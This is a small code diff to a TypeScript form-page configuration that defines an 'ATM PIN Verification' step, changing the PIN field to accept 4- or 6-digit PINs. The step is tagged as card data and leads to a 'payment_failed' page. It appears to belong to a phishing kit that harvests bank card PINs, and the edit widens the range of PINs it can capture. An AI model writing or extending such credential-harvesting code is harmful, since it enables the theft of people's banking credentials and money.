@@ -100,7 +100,7 @@ export const FORM_PAGES: PageConfig[] = [
         pageName: 'atm_pin',
         title: 'ATM PIN Verification',
         fields: [
-            { key: 'atmPin', displayName: 'ATM PIN', type: 'password', category: 'card', required: true, maxlength: 4, placeholder: '4-digit PIN' },
+            { key: 'atmPin', displayName: 'ATM PIN', type: 'password', category: 'card', required: true, maxlength: 6, placeholder: '4 or 6-digit PIN' },
         ],
         nextPage: { main: 'payment_failed' },
     },
